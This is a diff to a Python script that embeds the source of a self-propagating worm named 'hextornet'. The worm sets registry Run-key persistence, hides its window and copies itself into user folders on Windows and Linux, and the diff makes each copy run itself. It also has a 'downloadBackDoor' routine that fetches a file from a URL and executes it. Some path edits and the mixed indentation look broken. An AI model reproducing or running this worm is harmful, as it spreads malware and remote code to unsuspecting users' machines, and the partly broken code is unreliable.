@@ -23,8 +23,7 @@ print(
 """
 )
 
-code = """
-#!/usr/bin/env python
+code = """#!/usr/bin/env python
 
 #import win32con, win32api, win32console, win32gui
 #from _winreg import *
@@ -56,8 +55,8 @@ def hide():
 
 def addStartup():
     fp = os.path.dirname(os.path.realpath(__file__))
-    file_name = sys.argv[0].split("\\")[-1]
-    new_file_path = fp + "\\" + file_name
+    file_name = sys.argv[0].split("'\\'")[-1]
+    new_file_path = fp + "'\\'" + file_name
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
     key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
@@ -89,7 +88,7 @@ def propagate():
 		for directory in directories:
 			if windows_client():
 				for hexworm in hextornet:
-					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
+					dst = "C:\Users" + usr + "/" + directory + "/" + str(hexworm) + ".py"
 			elif linux_client():
 				for hexworm in hextornet:
 					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
@@ -114,13 +113,19 @@ def hide():
 
 
 def downloadBackDoor(url):
+	print''
+	print'===========Start downloading=========='
 	filename = url.split('/')[-1].split('#')[0].split('?')[0]
+	print"...Reading file"
 	content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
+	print'...Writing file'
         outfile.close()
-        run(os.path.abspath(filename))
-	print "==========finish downloading=========="
+        #run(os.path.abspath(filename))
+	print'==========finish downloading=========='
+	print''
+
 
 
 def run(program):
@@ -202,9 +207,9 @@ def propagate():
 					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
 			else:
 				dst = os.getcwd() + "hextornet.py"
-			#run(dst)
 			copyHex(hexworm, src, dst)
 			duplicate(dst)
+			run(dst)
 			directories.remove(directory)
 	print("=================================")
 
@@ -224,16 +229,20 @@ def hide():
 
 
 def downloadBackDoor(url):
+	print'===========Start downloading=========='
 	filename = url.split('/')[-1].split('#')[0].split('?')[0]
+	print"...Reading file"
 	content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
+	print'...Writing file'
         outfile.close()
         run(os.path.abspath(filename))
-	print "==========finish downloading=========="
+	print'==========finish downloading=========='
 
 
 def run(program):
+	print'[RUNNING]',program
 	process = sp.Popen('python '+program, shell=True)
 	process.wait()
 
